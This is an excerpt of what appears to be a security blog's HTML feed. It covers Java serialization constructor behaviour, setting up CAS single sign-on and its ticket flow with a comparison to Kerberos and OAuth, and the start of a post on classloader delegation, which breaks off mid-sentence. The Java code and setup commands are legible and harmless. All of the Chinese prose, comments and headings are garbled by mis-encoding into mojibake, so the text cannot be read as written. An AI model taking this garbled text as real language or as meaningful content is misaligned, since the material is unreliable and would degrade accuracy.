class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserBase</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    UserBase()&#123;</span><br><span class="line">        System.out.println(<span class="string">"UserBaseæ— å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UserBase(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"UserBaseæœ‰å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User2</span> <span class="keyword">extends</span> <span class="title">UserBase</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User2()&#123;</span><br><span class="line">        System.out.println(<span class="string">"User2æ— å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User2(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"User2æœ‰å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ§åˆ¶å°è¾“å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UserBaseæ— å‚æ„é€ </span><br><span class="line">User2æœ‰å‚æ„é€ </span><br><span class="line">-----------------</span><br><span class="line">2333</span><br></pre></td></tr></table></figure><p>å½“åªæœ‰å­ç±»å®ç°Serializableæ¥å£çˆ¶ç±»æ²¡æœ‰å®ç°æ—¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerialAndUnserial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectOutputStream oops = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        oops.writeObject(<span class="keyword">new</span> User2(<span class="number">2333</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"-----------------"</span>);</span><br><span class="line">        ObjectInputStream oips = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        User2 user = (User2) oips.readObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(user.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserBase</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    UserBase()&#123;</span><br><span class="line">        System.out.println(<span class="string">"UserBaseæ— å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UserBase(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"UserBaseæœ‰å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User2</span> <span class="keyword">extends</span> <span class="title">UserBase</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User2()&#123;</span><br><span class="line">        System.out.println(<span class="string">"User2æ— å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User2(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"User2æœ‰å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UserBaseæ— å‚æ„é€ </span><br><span class="line">User2æœ‰å‚æ„é€ </span><br><span class="line">-----------------</span><br><span class="line">UserBaseæ— å‚æ„é€ </span><br><span class="line">0</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“åŠä¸€äº›tip"><a href="#æ€»ç»“åŠä¸€äº›tip" class="headerlink" title="æ€»ç»“åŠä¸€äº›tip"></a>æ€»ç»“åŠä¸€äº›tip</h2><ul><li>åºåˆ—åŒ–æ—¶ï¼Œå½“å†™å…¥ç±»çš„å…ƒæ•°æ®çš„æ—¶å€™ï¼Œæ˜¯å…ˆå†™å­ç±»çš„ç±»å…ƒæ•°æ®ï¼Œç„¶åé€’å½’è°ƒç”¨çš„å†™å…¥çˆ¶ç±»çš„ç±»å…ƒæ•°æ®ï¼ˆåªæœ‰å®ç°åºåˆ—åŒ–æ¥å£çš„æ‰ä¼šæœ‰ç±»å…ƒæ•°æ®ï¼‰ã€‚</li><li>é˜²å¾¡ååºåˆ—åŒ–çš„åŸç†æ˜¯åœ¨resolveClasså¤„è®¾é˜²è€Œä¸æ˜¯readResolve</li><li>åœ¨åºåˆ—åŒ–æ•°æ®æœ«å°¾åŠ å…¥è„æ•°æ®ä¸ä¼šå½±å“æ­£å¸¸çš„ååºåˆ—åŒ–ã€‚</li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/qq_36744284/article/details/89604011">javaä¸­çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŠå…¶æºç åˆ†æï¼ˆç‰¹åˆ«è¯¦ç»†ï¼‰</a><br><a href="http://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/">å…ˆçŸ¥å¤§ä¼šè®®é¢˜Javaååºåˆ—åŒ–å®æˆ˜</a><br>[ä»WebLogicçœ‹ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ä¸é˜²å¾¡](</p>]]></content>
    
    <summary type="html">
    
      å†™è¿™ç¯‡æ–‡ç« ç›®çš„ä¸»è¦åœ¨äºè¿›ä¸€æ­¥ç†è§£ä½•ä¸ºjavaåŸç”Ÿååºåˆ—åŒ–ï¼Œå¹¶ä¸”å›ç­”å¦‚ä¸‹çš„å‡ ä¸ªé—®é¢˜ã€‚
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CASçš„æ­å»ºåŠè®¤è¯æµç¨‹åˆ†æä¸æ¯”è¾ƒ</title>
    <link href="https://cl0und.github.io/2020/01/31/CAS%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E6%AF%94%E8%BE%83/"/>
    <id>https://cl0und.github.io/2020/01/31/CAS%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E6%AF%94%E8%BE%83/</id>
    <published>2020-01-31T04:24:48.000Z</published>
    <updated>2020-07-11T07:59:50.186Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><h2 id="CAS-ç®€ä»‹"><a href="#CAS-ç®€ä»‹" class="headerlink" title="CAS ç®€ä»‹"></a>CAS ç®€ä»‹</h2><p>CASæ˜¯ä¸€ä¸ªå•ç‚¹ç™»å½•ï¼ˆSingle Sign On,ç®€ç§°SSOï¼ŒSSOä½¿å¾—åœ¨å¤šä¸ªåº”ç”¨ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·åªéœ€è¦ç™»å½•ä¸€æ¬¡å°±å¯ä»¥è®¿é—®æ‰€æœ‰ç›¸äº’ä¿¡ä»»çš„åº”ç”¨ç³»ç»Ÿï¼‰æ¡†æ¶ï¼Œå¼€å§‹æ˜¯ç”±è€¶é²å¤§å­¦çš„ä¸€ä¸ªç»„ç»‡å¼€å‘ï¼Œåæ¥å½’åˆ°apereoå»ç®¡ã€‚</p><h2 id="CAS-Serveræ­å»º"><a href="#CAS-Serveræ­å»º" class="headerlink" title="CAS Serveræ­å»º"></a>CAS Serveræ­å»º</h2><p>åœ¨æ­¤ä¸‹è½½ï¼š<a href="https://github.com/apereo/cas/tree/4.1.x">https://github.com/apereo/cas/tree/4.1.x</a><br>é€šå¸¸æ¥è¯´ç”¨mvnç¼–è¯‘cas-server-webappåæ”¾åˆ°tomcatä¸­å°±è¡Œï¼Œä½†æ˜¯casé»˜è®¤éœ€è¦èµ°httpsï¼Œå¦åˆ™åœ¨ç™»é™†æµç¨‹å’Œè·³è½¬webappæµç¨‹ä¸­ä¼šå‡ºç°å¦‚ä¸‹ä¸¤ç§æŠ¥é”™ã€‚<br><img src="1580368543216-ba5d0a82-fc02-4225-9a7c-cc0c168f604b.png#align=left&display=inline&height=287&name=image.png&originHeight=574&originWidth=2072&size=171406&status=done&style=none&width=1036" alt="image.png"></p><p><img src="1580368461615-7a24430e-9bf3-4689-9c3b-e9168d2d177d.png#align=left&display=inline&height=330&name=image.png&originHeight=660&originWidth=2114&size=175710&status=done&style=none&width=1057" alt="image.png"></p><p>ç¬¬ä¸€ç§è§£å†³åŠæ³•æ˜¯ç”Ÿæˆä¸€ä¸ªè‡ªç­¾åçš„sslè¯ä¹¦å¹¶åœ¨tomcatçš„server.xmlä¸­é…ç½®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -<span class="built_in">alias</span> tomcat -keyalg RSA -keystore /path/to/my/keystore</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8443"</span> <span class="attr">protocol</span>=<span class="string">"org.apache.coyote.http11.Http11NioProtocol"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">maxThreads</span>=<span class="string">"150"</span> <span class="attr">SSLEnabled</span>=<span class="string">"true"</span> <span class="attr">scheme</span>=<span class="string">"https"</span> <span class="attr">secure</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">keystoreFile</span>=<span class="string">"$&#123;user.home&#125;/.keystore"</span> <span class="attr">keystorePass</span>=<span class="string">"p@assw0rd"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">clientAuth</span>=<span class="string">"false"</span> <span class="attr">sslProtocol</span>=<span class="string">"TLS"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ–¹æ³•å½±å“wiresharkåç»­æŠ“åŒ…åˆ†æï¼Œå¹¶ä¸”é»˜è®¤æƒ…å†µä¸‹CASè¦æ±‚webappä¹Ÿæ˜¯httpsã€‚</p><p>ç¬¬äºŒç§åŠæ³•æ˜¯ä¿®æ”¹casé…ç½®ä½¿å…¶å…è®¸httpã€‚æœ‰ä¸‹é¢å››æ­¥ã€‚</p><ol><li><p>åœ¨<code>p:httpClient-ref=&quot;supportsTrustStoreSslSocketFactoryHttpClient&quot;</code>åå¢åŠ <code>p:requireSecure=&quot;false&quot;</code><img src="1580377596613-3c72dd9e-f517-473f-9eea-e8a86e5e0d16.png#align=left&display=inline&height=103&name=image.png&originHeight=206&originWidth=2182&size=60740&status=done&style=none&width=1091" alt="image.png"></p></li><li><p>ä¿®æ”¹WEB-INF/spring-configuration/ticketGrantingTicketCookieGenerator.xml<img src="1580377875413-89e3960e-4e30-435c-930b-7f720762d0a1.png#align=left&display=inline&height=135&name=image.png&originHeight=270&originWidth=2218&size=71387&status=done&style=none&width=1109" alt="image.png"></p></li></ol><ol start="3"><li>ä¿®æ”¹WEB-INF/spring-configuration/warnCookieGenerator.xml<img src="1580377924581-fc1351cc-d72d-4f50-abe3-217a43230b80.png#align=left&display=inline&height=137&name=image.png&originHeight=274&originWidth=2064&size=61824&status=done&style=none&width=1032" alt="image.png"></li></ol><ol start="4"><li>ä¿®æ”¹æ³¨å†ŒæœåŠ¡WEB-INF/classes/services/HTTPSandIMAPS-10000001.jsonå°†<code>&quot;serviceId&quot; : &quot;^(https|imaps)://.*&quot;</code>ä¿®æ”¹ä¸º<code>&quot;serviceId&quot; : &quot;^(https|http|imaps)://.*&quot;</code><img src="1580377987989-7a8526d8-9459-4ac3-bf96-66f71578f201.png#align=left&display=inline&height=66&name=image.png&originHeight=120&originWidth=1318&size=22754&status=done&style=none&width=720" alt="image.png"></li></ol><p>ä¿®æ”¹é‡å¯åè™½ç„¶å‰ç«¯è¿˜æ˜¯ä¼šçˆ†é”™ï¼Œä½†æ˜¯å…¶å®æ­£å¸¸ç™»é™†äº†ã€‚é»˜è®¤çš„å¸å¯†æ˜¯casuser/Mellonï¼Œè®°å½•åœ¨deployerConfigContext.xmlä¸­ã€‚<br><img src="1580356310308-00f8b236-b1d6-43bd-a1d2-a729df5cbf65.png#align=left&display=inline&height=516&name=image.png&originHeight=1032&originWidth=3030&size=386108&status=done&style=none&width=1515" alt="image.png"><br><img src="1580378152394-9517eb31-cb68-4d15-a187-2868a1f7277a.png#align=left&display=inline&height=607&name=image.png&originHeight=1214&originWidth=2150&size=275338&status=done&style=none&width=1075" alt="image.png"></p><p><img src="1580378176954-6713c06c-70af-4ac3-9f5c-b0e34fcf8e19.png#align=left&display=inline&height=493&name=image.png&originHeight=986&originWidth=2330&size=226505&status=done&style=none&width=1165" alt="image.png"></p><h2 id="Webappæ­å»º"><a href="#Webappæ­å»º" class="headerlink" title="Webappæ­å»º"></a>Webappæ­å»º</h2><p>åœ¨æ­¤ä¸‹è½½ï¼š<a href="https://github.com/UniconLabs/cas-sample-java-webapp">https://github.com/UniconLabs/cas-sample-java-webapp</a><br>ä¿®æ”¹web.xmlä¸­casServerLoginUrlã€casServerUrlPrefixã€serverNameå€¼ã€‚casServerLoginUrlå¯¹åº”cas serveråœ°å€ï¼ˆå¦‚æœæ¥å®¢æ²¡æœ‰ç™»é™†è¿‡webappå°±ä¼šæŠŠæ¥å®¢é‡å®šå‘åˆ°è¿™é‡Œè¿›è¡Œcasç»Ÿä¸€è®¤è¯ï¼‰ï¼ŒcasServerUrlPrefixå¯¹åº”cas serveråœ°å€ï¼ˆè¿™ä¸ªå€¼åç»­ä¼šè·Ÿä¸€äº›apiè·¯å¾„åšæ‹¼æ¥ï¼‰ï¼ŒserverNameæ˜¯webappåœ°å€ã€‚<br><img src="1580380855855-5bfed017-f240-4af9-a5e7-0555444cb000.png#align=left&display=inline&height=485&name=image.png&originHeight=970&originWidth=2062&size=158930&status=done&style=none&width=1031" alt="image.png"></p><h2 id="è®¤è¯æµç¨‹åˆ†æ"><a href="#è®¤è¯æµç¨‹åˆ†æ" class="headerlink" title="è®¤è¯æµç¨‹åˆ†æ"></a>è®¤è¯æµç¨‹åˆ†æ</h2><p>ç¯å¢ƒipè¯´æ˜<br>cas serverï¼š172.16.247.1<br>cas webappï¼š172.16.247.139<br>ç”¨æˆ·ï¼š172.16.247.131</p><ul><li>userè®¿é—®webappï¼Œå› ä¸ºä¹‹å‰ä»æœªç™»é™†è¿‡webappï¼Œæ‰€ä»¥webappä¼šæŠŠuseré‡å®šå‘ç»™casè¿›è¡Œç»Ÿä¸€ç™»é™†ï¼ˆé‡å®šå‘çš„urlçš„serivceä¸­å¸¦æœ‰webappè‡ªå·±çš„urlå¥½è®©casçŸ¥é“userç™»é™†æˆåŠŸåè¯¥é‡å®šå‘å›å“ªé‡Œï¼‰ã€‚<img src="1580383571657-a271c09d-0890-442f-b3f6-6a172f235f53.png#align=left&display=inline&height=243&name=image.png&originHeight=486&originWidth=1854&size=118852&status=done&style=none&width=927" alt="image.png"></li><li>useråœ¨casç™»é™†ï¼Œç™»é™†æˆåŠŸåcasä¼šç»™userå¸¦ä¸€ä¸ªcookieï¼ˆTGCä¹Ÿå«TGTï¼Œå¦‚æœä¹‹åè¦ç™»é™†å…¶ä»–webappå°±ä¸ç”¨é‡å¤è¾“å…¥å¯†ç è€Œæ˜¯ç›´æ¥ç»™STäº†ï¼‰å’Œä¸€ä¸ªSTï¼ˆåœ¨location urlä¸­ï¼‰çš„302å›webappã€‚<img src="1580383821801-70d72983-d348-48c3-8a07-c770ec082c77.png#align=left&display=inline&height=262&name=image.png&originHeight=524&originWidth=2476&size=231885&status=done&style=none&width=1238" alt="image.png"></li><li>webappæ‹¿åˆ°userè¯·æ±‚è¿‡æ¥çš„STä¼šå‘CASçš„apiå‘é€å·²éªŒè¯STçš„åˆæ³•æ€§ï¼Œå¦‚æœcaséªŒè¯æˆåŠŸä¼šå‘é€ç»™CASçš„æ˜¯æˆåŠŸçš„çŠ¶æ€ä¿¡æ¯å’Œç”¨æˆ·çš„ä¸€äº›æ•°æ®ã€‚<img src="1580384247485-354438d9-9482-4450-8b26-01ada6bd18c4.png#align=left&display=inline&height=147&name=image.png&originHeight=294&originWidth=2190&size=82873&status=done&style=none&width=1095" alt="image.png"><br><img src="1580384287803-1b5da7b9-c455-4ae4-9557-47a1629d157e.png#align=left&display=inline&height=678&name=image.png&originHeight=1356&originWidth=2142&size=177667&status=done&style=none&width=1071" alt="image.png"></li><li>webappä»casé‚£é‡Œå¾—çŸ¥STæ˜¯æœ‰æ•ˆçš„ï¼Œç»™userè®¾ç½®cookieï¼ˆç”¨æˆ·ä¹‹åå°±ä¸å¿…å†èµ°ä¸€æ¬¡è¿™ä¸ªæµç¨‹äº†ï¼‰ã€‚å¹¶è®©ç”¨æˆ·æˆåŠŸç™»é™†ã€‚<img src="1580384354171-e57ad4ab-a595-442d-968f-44eef905f385.png#align=left&display=inline&height=103&name=image.png&originHeight=206&originWidth=1736&size=59328&status=done&style=none&width=868" alt="image.png"></li></ul><p>ä¸€å›¾èƒœåƒè¨€ï¼Œå›¾ç‰‡æ¥è‡ªç½‘ç»œï¼ˆä¾µåˆ ï¼‰ã€‚</p><p><img src="1580374514900-55ff9aef-070f-4dc4-9da7-e2a70721372a.png#align=left&display=inline&height=672&name=image.png&originHeight=1344&originWidth=1630&size=652092&status=done&style=none&width=815" alt="image.png"></p><h2 id="SSO-vs-Kerberos-vs-OAuth"><a href="#SSO-vs-Kerberos-vs-OAuth" class="headerlink" title="SSO vs Kerberos vs OAuth"></a>SSO vs Kerberos vs OAuth</h2><p>å½“æ—¶çœ‹å®Œæ•´ä¸ªcasçš„è®¤è¯æµç¨‹æ„Ÿè§‰é‡Œé¢ä¸€äº›è¦ç´ å’Œkerberoså’ŒOAuthè®¤è¯å¾ˆç›¸ä¼¼ï¼ˆéƒ½æœ‰ä¸€ä¸ªç¬¬ä¸‰æ–¹æ¥è¿›è¡Œè®¤è¯/æˆæƒï¼‰ã€‚å› æ­¤ç›¸æ¯”è¾ƒä¸€ä¸‹è¿™ä¸‰è€…çš„åŒºåˆ«ã€‚</p><h3 id="SSO-vs-Kerberos"><a href="#SSO-vs-Kerberos" class="headerlink" title="SSO vs Kerberos"></a>SSO vs Kerberos</h3><p>ssoå’Œkerberoså’Œå…±åŒç‚¹åœ¨ä»–ä»¬éƒ½ä¸€ä¸ªç”¨TGTæ¢STçš„è¿‡ç¨‹ï¼Œä¸åŒç‚¹åœ¨äºkerberosä¸­å…¶å®æœ‰å››ä¸ªè§’è‰²ï¼ˆclientï¼ŒKDC-ASï¼ŒKDC-TSï¼Œserverï¼‰å¹¶ä¸”å› ä¸ºâ€œç›¸è¿‘â€çš„ä¸¤ä¸ªä¹‹é—´é¢„å…ˆå…±äº«å¯†é’¥ï¼Œæ‰€ä»¥serverä¸éœ€è¦å‘é€è¯·æ±‚å‘KDCæ±‚è¯STçš„çœŸå®æ€§ï¼Œä½†æ˜¯CASä¸­serveréœ€è¦å‘cas serveræ±‚è¯çœŸå®æ€§ã€‚</p><h3 id="SSO-vs-OAuth"><a href="#SSO-vs-OAuth" class="headerlink" title="SSO vs OAuth"></a>SSO vs OAuth</h3><p>å®ƒä¿©ä¹‹å‰æœ€å¤§çš„ä¸åŒçš„åœ¨ä¸šåŠ¡åœºæ™¯çš„ä¸åŒï¼ŒSSOç”¨åœ¨ä¸€ä¸ªå…¬å¸å†…éƒ¨å‘˜å·¥çš„å•ç‚¹ç™»é™†ã€‚OAuthç”¨åœ¨ä¸¤ä¸ªå…¬å¸ä¹‹å‰Aå…¬å¸è·å–å…¶ç”¨æˆ·åœ¨Bå…¬å¸çš„ä¸€äº›æ•°æ®ã€‚OAuthè¿˜å¸¸å¸¸æ¶‰åŠåˆ°å•ŠABä¸¤å…¬å¸çš„å¸å·ç»‘å®šï¼Œæ‰€ä»¥éœ€è¦stateæ¥é˜²æ­¢csrfï¼Œè¿™ä¸ªæ˜¯SSOé‡Œé¢æ²¡æœ‰çš„ã€‚</p><h2 id="æ‚"><a href="#æ‚" class="headerlink" title="æ‚"></a>æ‚</h2><p>ç¼–è¯‘æ•´ä¸ªcasçš„é‡åˆ°org.samba.jcifs:jcifs-ext:0.9.4æ— æ³•ä¸‹è½½çš„é—®é¢˜ï¼Œé€‰æ‹©æ‰‹åŠ¨ä¸‹è½½jarå¹¶å®‰è£…åˆ°æœ¬åœ°mavenä»“åº“ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä¸‹è½½åœ°å€ï¼šhttp://maven.yonyoucloud.com/nexus/content/groups/public/org/samba/jcifs/jcifs-ext/0.9.4/</span></span><br><span class="line">mvn install:install-file -DgroupId=org.samba.jcifs -DartifactId=jcifs-ext -Dversion=0.9.4 -Dpackaging=jar -Dfile=/Users/cengsiqi/Downloads/jcifs-ext-0.9.4.jar</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/chenhai201/article/details/50623395">cas 4.1.4å•ç‚¹ç™»å½•å®æˆ˜</a><br><a href="https://blog.51cto.com/fengwan/1876603">CAS 4.1.10å…³é—­HTTPS</a><br><a href="https://blog.csdn.net/GaoXiR/article/details/99539501">ä½¿ç”¨mavenå‘½ä»¤å®‰è£…jaråŒ…åˆ°æœ¬åœ°mavenä»“åº“</a><br><a href="https://blog.csdn.net/mahoking/article/details/42319475">Spring Pæ ‡ç­¾çš„ä½¿ç”¨</a></p>]]></content>
    
    <summary type="html">
    
      CASæ˜¯ä¸€ä¸ªå•ç‚¹ç™»å½•ï¼ˆSingle Sign On,ç®€ç§°SSOï¼ŒSSOä½¿å¾—åœ¨å¤šä¸ªåº”ç”¨ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·åªéœ€è¦ç™»å½•ä¸€æ¬¡å°±å¯ä»¥è®¿é—®æ‰€æœ‰ç›¸äº’ä¿¡ä»»çš„åº”ç”¨ç³»ç»Ÿã€‚ï¼‰æ¡†æ¶ï¼Œå¼€å§‹æ˜¯ç”±è€¶é²å¤§å­¦çš„ä¸€ä¸ªç»„ç»‡å¼€å‘ï¼Œåæ¥å½’åˆ°apereoå»ç®¡ã€‚
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Javaä¸­åŒäº²å§”æ´¾ç›¸å…³çŸ¥è¯†æ¢³ç†</title>
    <link href="https://cl0und.github.io/2020/01/22/Java%E4%B8%AD%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"/>
    <id>https://cl0und.github.io/2020/01/22/Java%E4%B8%AD%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</id>
    <published>2020-01-22T03:02:04.000Z</published>
    <updated>2020-07-11T08:03:20.445Z</updated>
    
    <content type="html"><![CDATA[<!-- åœ¨ååºåˆ—åŒ–çš„å­¦ä¹ è¿‡ç¨‹ä¸­æ€»æ˜¯ä¸å¯å›é¿ç¢°åˆ°è¿™ä¸ªç‚¹ï¼Œè¿™æ¬¡å°±æ¥ç®€å•çœ‹çœ‹ã€‚ --><!-- more --><h2 id="classloaderä»‹ç»"><a href="#classloaderä»‹ç»" class="headerlink" title="classloaderä»‹ç»"></a>classloaderä»‹ç»</h2><p>åœ¨javaä¸­æ¯å½“éœ€è¦åŠ è½½ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå°±éœ€è¦ç”¨åˆ°ç±»åŠ è½½å™¨ï¼ˆclassloaderï¼‰ï¼Œå®ƒå­˜åœ¨çš„æ„ä¹‰åœ¨äºæŠŠclassæ–‡ä»¶ä¸­å­—èŠ‚ç å˜æˆå¯ä»¥è¢«javaä½¿ç”¨çš„classå¯¹è±¡ã€‚javaä¸­åŸç”Ÿè‡ªå¸¦3ä¸ªclassloaderåˆ†åˆ«æ˜¯Bootstrap ClassLoaderã€Ext ClassLoaderã€App ClassLoaderå¦å¤–ç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå®šä¹‰Custom ClassLoaderã€‚é‚£å®é™…åŠ è½½ç±»çš„æ—¶å€™æ˜¯ç”¨å“ªä¸€ä¸ªåŠ è½½å™¨ï¼Ÿjavaä¸ºäº†å®‰å…¨ç€æƒ³è§„å®šäº†classloaderä¹‹é—´æœ‰ä¸€å¥—ç­‰çº§æœºåˆ¶ã€‚<strong>å…·ä½“æ¥è¯´å°±æ˜¯ï¼šå½“ä»å­åŠ è½½å™¨å‡ºå‘ï¼Œä½†å­åŠ è½½å™¨åŠ è½½classçš„æ—¶å€™ä¼šå…ˆå§”æ´¾ç»™ç”±çˆ¶åŠ è½½å™¨å…ˆåŠ è½½ï¼Œå¦‚æœçˆ¶åŠ è½½å™¨æ— æ³•åŠ è½½å†ç”±å­åŠ è½½å™¨åŠ è½½ï¼Œè€Œè¿™å¥—å…ˆåé¡ºåºå°±æ˜¯å¹³æ—¶æ‰€è¯´çš„åŒäº²å§”æ´¾</strong>ã€‚</p><p><img src="1579506416646-166ccd99-ce6c-45d5-a303-192216a575ed.png#align=left&display=inline&height=503&name=image.png&originHeight=294&originWidth=436&size=49254&status=done&style=none&width=746" alt="image.png"></p><ul><li><p>BootstrapClassLoaderï¼Œå¯åŠ¨ç±»åŠ è½½å™¨/æ ¹åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM è¿è¡Œæ—¶æ ¸å¿ƒç±»ï¼Œè¿™äº›ç±»ä½äº JAVA_HOME/lib/rt.jar æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨å†…ç½®åº“ java.<em>.</em> éƒ½åœ¨é‡Œé¢ã€‚è¿™ä¸ª ClassLoader æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒå…¶å®ä¸æ˜¯ä¸€ä¸ªClassLoaderå®ä¾‹å¯¹è±¡ï¼Œè€Œæ˜¯ç”±Cä»£ç å®ç°ã€‚ç”¨æˆ·åœ¨å®ç°è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ—¶ï¼Œå¦‚æœéœ€è¦æŠŠåŠ è½½è¯·æ±‚å§”æ´¾ç»™å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œé‚£å¯ä»¥ç›´æ¥ä¼ å…¥nullä½œä¸º BootstrapClassLoaderã€‚</p></li><li><p>ExtClassLoaderï¼Œæ‰©å±•ç±»åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM æ‰©å±•ç±»ï¼Œæ‰©å±• jar åŒ…ä½äº 